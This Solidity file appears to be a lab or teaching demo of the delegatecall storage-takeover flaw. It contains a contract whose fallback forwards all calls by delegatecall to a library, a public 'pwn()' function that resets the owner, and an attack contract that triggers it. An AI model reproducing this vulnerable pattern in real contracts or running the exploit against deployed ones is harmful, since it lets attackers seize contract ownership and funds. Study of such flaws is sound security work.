pragma solidity ^0.8.4;
import "hardhat/console.sol";
contract Lib {
    address public owner;
    

    constructor() {
        owner = msg.sender;
    }

    function pwn() public payable {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    function getOwner() public view returns(address) {
        return owner;
    }

    fallback() external payable {
        (bool sent, ) = payable(address(lib)).delegatecall(msg.data);
    }
}

contract DelAttack {
    address public hackMe;
    address public newOwner;
    constructor(address _hackMe, address _newOwner) {
        hackMe = _hackMe;
        newOwner = _newOwner;
    }

    function attack() public {
         (bool sent, ) = hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}